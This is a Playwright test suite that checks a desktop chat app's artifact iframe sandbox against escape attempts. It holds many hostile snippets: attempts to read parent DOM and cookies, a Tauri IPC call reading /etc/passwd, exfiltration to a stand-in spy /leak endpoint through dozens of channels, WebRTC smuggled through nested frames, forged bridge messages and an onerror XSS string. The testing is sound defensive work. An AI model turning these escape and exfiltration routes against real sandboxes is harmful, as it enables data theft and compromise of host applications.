// T-ART-05 sandbox escape suite. Each test renders hostile artifact code and then checks, from
// OUTSIDE the frame, that nothing escaped: the spy server (another origin, HTTP + UDP) saw no
// traffic, the host DOM/storage/cookies/title are unchanged, and the fake Tauri IPC on the host
// was never called. In-frame probe results (posted to the host) are checked too, but they are
// only supporting evidence: artifact code could lie.
import { expect, test, type Page } from "@playwright/test";
import { ART, SPY, expectHostIntact, frame, instrumentHost, openDemo, show, spyLog, spyReset } from "./helpers";

test.beforeEach(async ({ page }) => {
  await openDemo(page);
  await instrumentHost(page);
  await spyReset(page);
});

test.afterEach(async ({ page }) => {
  await expectHostIntact(page);
});

async function probes(page: Page, count: number): Promise<Record<string, string>> {
  await expect.poll(() => page.evaluate(() => (window as unknown as { __probes: unknown[] }).__probes.length), { timeout: 10_000 }).toBeGreaterThanOrEqual(count);
  const all = (await page.evaluate(() => (window as unknown as { __probes: unknown[] }).__probes)) as [string, string][];
  return Object.fromEntries(all);
}

/** Wraps attack snippets: each runs in try/catch and reports [name, outcome]. */
function attackDoc(attacks: Record<string, string>): string {
  const body = Object.entries(attacks)
    .map(
      ([name, code]) => `
  (async () => {
    let r;
    try { r = await (async () => { ${code} })(); r = "ok:" + String(r); }
    catch (e) { r = "blocked:" + (e && e.name ? e.name : String(e)); }
    parent.postMessage({ probe: [${JSON.stringify(name)}, r] }, "*");
  })();`,
    )
    .join("\n");
  return `<!doctype html><html><body><p id="m">attacks</p><script>${body}\n</script></body></html>`;
}

const SPY_URL = `${SPY}/leak`;

test("cannot reach the parent DOM, globals or Tauri IPC", async ({ page }) => {
  const attacks = {
    parentDocument: `return parent.document.getElementById("host-secret").textContent;`,
    topDocument: `top.document.body.setAttribute("data-pwned", "1"); return "wrote";`,
    parentLocation: `return parent.location.href;`,
    parentTauri: `return typeof parent.__TAURI_INTERNALS__.invoke;`,
    parentTauriCall: `parent.__TAURI_INTERNALS__.invoke("plugin:fs|read_file", {path: "/etc/passwd"}); return "called";`,
    parentIpc: `parent.ipc.postMessage("x"); return "called";`,
    ownTauri: `if (typeof window.__TAURI_INTERNALS__ !== "undefined" || typeof window.ipc !== "undefined" || typeof window.__TAURI__ !== "undefined") return "present"; throw new Error("absent")`,
    frameElement: `if (window.frameElement === null) throw new Error("null"); return "visible";`,
    opener: `if (!window.opener) throw new Error("none"); return "has opener";`,
    origin: `if (self.origin !== "null") return self.origin; throw new Error("opaque");`,
    ipcFetch: `const r = await fetch("ipc://localhost/plugin%3Afs%7Cread_file", {method: "POST", body: "{}"}); return r.status;`,
    ipcHttpFetch: `const r = await fetch("http://ipc.localhost/plugin%3Afs%7Cread_file", {method: "POST", body: "{}"}); return r.status;`,
    appOriginFetch: `const r = await fetch("http://127.0.0.1:4173/__hits"); return r.status;`,
    sameShellFetch: `const r = await fetch("${ART}/__log"); return r.status;`,
  };
  await show(page, { kind: "html" }, attackDoc(attacks));
  const r = await probes(page, Object.keys(attacks).length);
  for (const [name, outcome] of Object.entries(r)) {
    expect.soft(outcome, name).toMatch(/^blocked:/);
  }
  expect(await spyLog(page)).toEqual([]);
  // The app server never saw a request from the frame.
  const appHits = (await (await page.request.get("/__hits")).json()) as string[];
  expect(appHits.filter((h) => h.startsWith("/__hits") && h !== "/__hits")).toEqual([]);
});

test("cannot read cookies or storage of any origin", async ({ page }) => {
  const attacks = {
    cookie: `return document.cookie;`,
    setCookie: `document.cookie = "x=1"; return document.cookie;`,
    localStorage: `return localStorage.getItem("dn-secret");`,
    sessionStorage: `return sessionStorage.getItem("dn-secret");`,
    indexedDB: `return await new Promise((res, rej) => { const q = indexedDB.open("x"); q.onsuccess = () => res("opened"); q.onerror = () => rej(q.error); });`,
    cacheStorage: `return (await caches.keys()).length;`,
    serviceWorker: `await navigator.serviceWorker.register("sw.js"); return "registered";`,
    broadcast: `new BroadcastChannel("dn").postMessage("x"); return "posted";`,
  };
  await show(page, { kind: "html" }, attackDoc(attacks));
  const r = await probes(page, Object.keys(attacks).length);
  for (const [name, outcome] of Object.entries(r)) {
    // BroadcastChannel may construct, but in an opaque origin it reaches no one else.
    if (name === "broadcast") continue;
    expect.soft(outcome, name).toMatch(/^blocked:/);
  }
});

test("cannot use the network (scripted requests)", async ({ page }) => {
  const attacks = {
    fetch: `return (await fetch("${SPY_URL}?fetch")).status;`,
    fetchNoCors: `await fetch("${SPY_URL}?nocors", {mode: "no-cors"}); return "sent";`,
    xhr: `return await new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", "${SPY_URL}?xhr"); x.onload = () => res(x.status); x.onerror = () => rej(new Error("xhr error")); x.send(); });`,
    websocket: `return await new Promise((res, rej) => { const w = new WebSocket("${SPY.replace("http", "ws")}/ws"); w.onopen = () => res("open"); w.onerror = () => rej(new Error("ws error")); });`,
    eventSource: `return await new Promise((res, rej) => { const e = new EventSource("${SPY_URL}?sse"); e.onopen = () => res("open"); e.onerror = () => rej(new Error("sse error")); });`,
    beacon: `if (navigator.sendBeacon("${SPY_URL}?beacon", "x")) return "queued"; throw new Error("refused");`,
    worker: `new Worker("${SPY_URL}?worker.js"); return "constructed";`,
    blobWorker: `new Worker(URL.createObjectURL(new Blob(["fetch('${SPY_URL}?blobworker')"]))); return "constructed";`,
    dynamicImport: `await import("${SPY_URL}?import.js"); return "imported";`,
    windowOpen: `const w = window.open("${SPY_URL}?open"); if (!w) throw new Error("null"); return "opened";`,
    webrtcGlobal: `const pc = new RTCPeerConnection({iceServers: [{urls: "stun:127.0.0.1:4174"}]}); pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer()); return "rtc";`,
    webrtcFreshRealm: `
      const f = document.createElement("iframe"); document.body.appendChild(f);
      const PC = f.contentWindow && f.contentWindow.RTCPeerConnection;
      if (!PC) throw new Error("no fresh realm");
      const pc = new PC({iceServers: [{urls: "stun:127.0.0.1:4174"}]}); pc.createDataChannel("x");
      await pc.setLocalDescription(await pc.createOffer()); await new Promise(r => setTimeout(r, 1500)); return "rtc";`,
    // A child frame runs its own copy of WebRTC (the bridge never ran there).
    webrtcChildFrame: `
      const f = document.createElement("iframe");
      f.srcdoc = '<script>const pc = new RTCPeerConnection({iceServers: [{urls: "stun:127.0.0.1:4174"}]}); pc.createDataChannel("x"); pc.createOffer().then(o => pc.setLocalDescription(o)); fetch("${SPY_URL}?child");<\\/script>';
      document.body.appendChild(f);
      await new Promise(r => setTimeout(r, 1500)); return "appended";`,
  };
  // These APIs accept the call and fail later (CSP blocks the request itself), so only the
  // external spy check counts for them.
  const externalOnly = new Set(["beacon", "blobWorker", "worker", "webrtcChildFrame"]);
  await show(page, { kind: "html" }, attackDoc(attacks));
  const r = await probes(page, Object.keys(attacks).length);
  for (const [name, outcome] of Object.entries(r)) {
    if (!externalOnly.has(name)) expect.soft(outcome, name).toMatch(/^blocked:/);
  }
  await page.waitForTimeout(2000);
  expect(await spyLog(page)).toEqual([]);
  test.info().annotations.push({ type: "probes", description: JSON.stringify(r) });
});

test("cannot use the network (markup and CSS)", async ({ page }) => {
  const u = (tag: string) => `${SPY_URL}?${tag}`;
  const doc = `<!doctype html><html><head>
<link rel="stylesheet" href="${u("css")}">
<link rel="prefetch" href="${u("prefetch")}">
<link rel="preload" as="image" href="${u("preload")}">
<link rel="preconnect" href="${SPY}">
<link rel="icon" href="${u("icon")}">
<script src="${u("script")}"></script>
<style>
  @import url("${u("import")}");
  @font-face { font-family: X; src: url("${u("font")}"); }
  body { background: url("${u("bg")}"); font-family: X; }
  .i { background-image: image-set("${u("imageset")}" 1x); }
</style>
<base href="${SPY}/">
</head><body>
<p class="i">markup</p>
<img src="${u("img")}" srcset="${u("srcset")} 2x">
<picture><source srcset="${u("picture")}"><img alt=""></picture>
<video src="${u("video")}" poster="${u("poster")}" autoplay muted></video>
<audio src="${u("audio")}" autoplay></audio>
<iframe src="${u("iframe")}"></iframe>
<object data="${u("object")}"></object>
<embed src="${u("embed")}">
<svg><image href="${u("svgimage")}" width="10" height="10"/><use href="${u("svguse")}#x"/></svg>
<form id="f" action="${u("form")}" method="post"><input name="a" value="b"></form>
<a id="a" href="${u("anchor")}" ping="${u("ping")}">a</a>
<a id="top" href="${u("top")}" target="_top">top</a>
<a id="blank" href="${u("blank")}" target="_blank">blank</a>
<script>
  try { document.getElementById("f").submit(); } catch (e) {}
  document.getElementById("blank").click();
  document.getElementById("top").click();
  try { top.location.href = "${u("toplocation")}"; } catch (e) {}
</script>
</body></html>`;
  await show(page, { kind: "html" }, doc);
  await expect(frame(page).locator("p.i")).toHaveText("markup");
  await page.waitForTimeout(2500);
  expect(await spyLog(page)).toEqual([]);
  // Still on the demo page and no popup opened.
  expect(page.context().pages()).toHaveLength(1);
});

test("cannot leak by navigating its own frame", async ({ page }) => {
  for (const nav of [
    `location.href = "${SPY_URL}?selfnav";`,
    `document.body.innerHTML = '<meta http-equiv="refresh" content="0;url=${SPY_URL}?refresh">';`,
    `location.href = "data:text/html,<script>fetch('${SPY_URL}?datanav')</script>";`,
    `document.getElementById("a").click();`,
  ]) {
    await spyReset(page);
    await show(page, { kind: "html" }, `<a id="a" href="${SPY_URL}?anchornav">a</a><script>setTimeout(() => { ${nav} }, 50);</script>`);
    await page.waitForTimeout(1500);
    expect(await spyLog(page), nav).toEqual([]);
  }
});

test("navigating to the network-enabled shell does not get content again", async ({ page }) => {
  // The host answers each frame's shell once. If artifact code reloads the shell with ?net=1
  // (whose CSP allows https:), the new document gets nothing and stays empty.
  await show(
    page,
    { kind: "html" },
    `<p id="x">v1</p><script>setTimeout(() => { location.href = "${ART}/frame/?net=1"; }, 50);</script>`,
  );
  await page.waitForTimeout(1500);
  await expect(frame(page).locator("body")).toBeEmpty();
});

test("network toggle on: still no http or loopback, still no host access", async ({ page }) => {
  const attacks = {
    httpFetch: `return (await fetch("${SPY_URL}?net-on")).status;`,
    parentDocument: `return parent.document.title;`,
    cookie: `return document.cookie;`,
  };
  await show(page, { kind: "html" }, attackDoc(attacks), { allowNetwork: true });
  const r = await probes(page, Object.keys(attacks).length);
  for (const [name, outcome] of Object.entries(r)) expect.soft(outcome, name).toMatch(/^blocked:/);
  expect(await spyLog(page)).toEqual([]);
});

test("forged bridge messages are inert", async ({ page }) => {
  await show(
    page,
    { kind: "html" },
    `<script>
      for (let i = 0; i < 5; i++) parent.postMessage({ channel: "dn-artifact", type: "shell-ready" }, "*");
      parent.postMessage({ channel: "dn-artifact", nonce: "guess", type: "issue", issue: { kind: "error", message: "wrong nonce" } }, "*");
      parent.postMessage({ channel: "dn-artifact", type: "render", html: "<b data-pwned>x</b>" }, "*");
      const nonce = document.currentScript.ownerDocument.querySelector("script[data-nonce]").dataset.nonce;
      parent.postMessage({ channel: "dn-artifact", nonce, type: "size", width: 1e12, height: 1e12 }, "*");
      parent.postMessage({ channel: "dn-artifact", nonce, type: "issue", issue: { kind: "error", message: "<img src=x onerror=alert(1) data-pwned>" } }, "*");
    </script><p id="ok">ok</p>`,
  );
  const issues = page.getByTestId("artifact-issues");
  await expect(issues).toContainText("<img src=x onerror=alert(1) data-pwned>");
  await expect(issues).not.toContainText("wrong nonce");
  // Height is clamped by the host, not set to the forged value.
  const h = await page.getByTestId("artifact-frame").evaluate((el) => (el as HTMLElement).style.height);
  expect(Number.parseInt(h, 10)).toBeLessThanOrEqual(2000);
  await expect(frame(page).locator("#ok")).toHaveText("ok");
});

test("a new version gets a fresh realm", async ({ page }) => {
  await show(page, { kind: "html" }, `<script>window.leftover = "v1-state";</script><p>v1</p>`);
  await expect(frame(page).locator("p")).toHaveText("v1");
  await show(page, { kind: "html" }, attackDoc({ leftover: `if (window.leftover) return window.leftover; throw new Error("clean");` }));
  const r = await probes(page, 1);
  expect(r["leftover"]).toMatch(/^blocked:/);
});

// WebRTC is outside CSP. The bridge removes it from the artifact realm and removes nested frames
// (fresh realms) before they load. Each route below tries to get a working RTCPeerConnection
// talking to the spy's UDP port.
const RTC = `const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:127.0.0.1:4174'}]}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));`;
const NESTED_FRAME_ROUTES: Record<string, string> = {
  markup: `<iframe srcdoc="<script>${RTC}</script>"></iframe>`,
  created: `<script>const f = document.createElement('iframe'); f.srcdoc = "<script>${RTC}<\\/script>"; document.body.appendChild(f);</script>`,
  aboutBlank: `<script>const f = document.createElement('iframe'); document.body.appendChild(f); try { const w = f.contentWindow; const PC = w.RTCPeerConnection; const pc = new PC({iceServers: [{urls: 'stun:127.0.0.1:4174'}]}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o)); } catch (e) { parent.postMessage({probe: ['aboutBlank', String(e)]}, '*'); }</script>`,
  dsd: `<div><template shadowrootmode="closed"><iframe srcdoc="<script>${RTC}</script>"></iframe></template></div>`,
  shadow: `<div id="h"></div><script>const r = document.getElementById('h').attachShadow({mode: 'closed'}); r.innerHTML = '<iframe srcdoc="<script>${RTC}<\\/script>"></iframe>';</script>`,
  fresh: `<script>const f = document.createElement('iframe'); document.body.appendChild(f); const PC = frames[0].RTCPeerConnection; const pc = new PC({iceServers: [{urls: 'stun:127.0.0.1:4174'}]}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));</script>`,
  dsdWrite: `<script>document.write('<div><template shadowrootmode="closed"><iframe srcdoc="<script>${RTC}<\\/script>"></iframe></template></div>');</script>`,
  setHtml: `<div id="h"></div><script>document.getElementById('h').setHTMLUnsafe('<div><template shadowrootmode="closed"><iframe srcdoc="<script>${RTC}<\\/script>"></iframe></template></div>');</script>`,
  nestedSync: `<script>const f = document.createElement('iframe'); f.srcdoc = "<script>${RTC}<\\/script>"; document.body.appendChild(f); f.remove(); document.body.appendChild(f);</script>`,
  patchedRemove: `<script>Element.prototype.remove = function () {}; Node.prototype.removeChild = function (c) { return c; }; MutationRecord.prototype && Object.defineProperty(MutationRecord.prototype, 'addedNodes', {get() { return []; }}); const f = document.createElement('iframe'); f.srcdoc = "<script>${RTC}<\\/script>"; document.body.appendChild(f);</script>`,
  webComponent: `<script>customElements.define('x-c', class extends HTMLElement { connectedCallback() { const r = this.attachShadow({mode: 'closed'}); r.innerHTML = '<iframe srcdoc="<script>${RTC}<\\/script>"></iframe>'; } });</script><x-c></x-c>`,
};

for (const [route, doc] of Object.entries(NESTED_FRAME_ROUTES)) {
  test(`no WebRTC through a nested frame: ${route}`, async ({ page }) => {
    await show(page, { kind: "html" }, doc);
    await page.waitForTimeout(2500);
    expect(await spyLog(page)).toEqual([]);
  });
}

test("forged messages don't reach app listeners that check their source (S7)", async ({ page }) => {
  // An app listener written the way S7 requires, plus a record of what arrives at the window.
  await page.evaluate(() => {
    const w = window as unknown as { __appActions: string[]; __seenOrigins: string[] };
    w.__appActions = [];
    w.__seenOrigins = [];
    window.addEventListener("message", (e) => {
      w.__seenOrigins.push(e.origin);
      if (e.source !== window || e.origin !== location.origin) return;
      const d = e.data as { action?: string } | null;
      if (d?.action) w.__appActions.push(d.action);
    });
  });
  await show(
    page,
    { kind: "html" },
    `<script>
      for (const t of [parent, top]) {
        t.postMessage({ action: "open-settings" }, "*");
        t.postMessage({ action: "delete-chat", id: "all" }, "*");
        try { t.postMessage({ action: "x" }, "http://127.0.0.1:4173"); } catch (e) {}
      }
      parent.postMessage({ probe: ["done", "sent"] }, "*");
    </script>`,
  );
  await probes(page, 1);
  const r = await page.evaluate(() => {
    const w = window as unknown as { __appActions: string[]; __seenOrigins: string[] };
    return { actions: w.__appActions, origins: [...new Set(w.__seenOrigins)] };
  });
  expect(r.actions).toEqual([]);
  expect(r.origins).toEqual(["null"]);
});

test("cannot move the host through session history", async ({ page }) => {
  // Give the host page history to go back to.
  await page.goto("/demo/index.html?first");
  await openDemo(page);
  await instrumentHost(page);
  const before = await page.evaluate(() => location.href);
  await show(
    page,
    { kind: "html" },
    `<script>
      try { history.pushState({}, "", "/evil"); } catch (e) {}
      try { history.replaceState({}, "", "${SPY_URL}?replace"); } catch (e) {}
      setTimeout(() => { try { history.back(); } catch (e) {} }, 50);
      setTimeout(() => { try { history.go(-2); } catch (e) {} }, 150);
    </script><p id="h">history</p>`,
  );
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => location.href)).toBe(before);
  expect(await spyLog(page)).toEqual([]);
});


// WebView2 (Windows) runs the app's init scripts in sub-frames too, so the frame itself can
// start with Tauri's IPC object (and its invoke key). The shell must remove it before artifact
// code runs, or refuse to render. `addInitScript` runs in every frame, like WebView2 does.
function injectFrameIpc(configurable: boolean, label = "main"): string {
  return `(() => {
    if (location.port !== "4175") return;
    const report = (what) => parent.postMessage({ probe: ["injectedIpc", what] }, "*");
    const internals = { invoke: () => report("invoke-called"), postMessage: () => report("pm-called") };
    // Tauri sets this before page scripts run, read-only (manager/webview.rs).
    Object.defineProperty(internals, "metadata", { value: { currentWindow: { label: "main" }, currentWebview: { label: ${JSON.stringify(label)} } } });
    Object.defineProperty(window, "__TAURI_INTERNALS__", { value: internals, configurable: ${configurable}, writable: ${configurable} });
    Object.defineProperty(window, "ipc", { value: Object.freeze({ postMessage: () => report("ipc-called") }), configurable: ${configurable} });
    window.chrome = Object.assign(window.chrome || {}, { webview: { postMessage: () => report("webview-called") } });
  })();`;
}

test("injected IPC globals in the frame are removed before artifact code runs", async ({ page }) => {
  await page.addInitScript(injectFrameIpc(true));
  await openDemo(page);
  await instrumentHost(page);
  const attacks = {
    internals: `if (typeof window.__TAURI_INTERNALS__ !== "undefined") { window.__TAURI_INTERNALS__.invoke("list_conversations"); return "present"; } throw new Error("absent");`,
    ipc: `if (typeof window.ipc !== "undefined") { window.ipc.postMessage("{}"); return "present"; } throw new Error("absent");`,
    webview: `if (window.chrome && window.chrome.webview) { window.chrome.webview.postMessage("{}"); return "present"; } throw new Error("absent");`,
  };
  await show(page, { kind: "html" }, attackDoc(attacks));
  const r = await probes(page, Object.keys(attacks).length);
  expect(r).toMatchObject({ internals: "blocked:Error", ipc: "blocked:Error", webview: "blocked:Error" });
  expect(r["injectedIpc"]).toBeUndefined();
});

test("a frame whose injected IPC can't be removed refuses to render", async ({ page }) => {
  await page.addInitScript(injectFrameIpc(false));
  await openDemo(page);
  await instrumentHost(page);
  await show(page, { kind: "html" }, attackDoc({ ran: `return "artifact code ran";` }));
  await expect(frame(page).locator("html")).toContainText("can't be shown safely", { timeout: 10_000 });
  await expect(page.locator(".dn-av-error")).toContainText("can't be shown safely");
  await page.waitForTimeout(500);
  const all = await page.evaluate(() => (window as unknown as { __probes: unknown[] }).__probes);
  expect(all).toEqual([]);
});

// Windows (ADR-0012): in the separate artifact webview the IPC object can't be removed either,
// but no capability names that webview, so the shell renders there (and only there: the label
// is Tauri's, set before any page script and read-only).
test("a frame in the isolated artifact webview renders although its IPC object stays", async ({ page }) => {
  await page.addInitScript(injectFrameIpc(false, "artifact"));
  await openDemo(page);
  await instrumentHost(page);
  await show(page, { kind: "html" }, attackDoc({ ran: `return "artifact code ran";` }));
  const r = await probes(page, 1);
  expect(r["ran"]).toBe("ok:artifact code ran");
  await expect(page.locator(".dn-av-error")).toBeHidden();
});
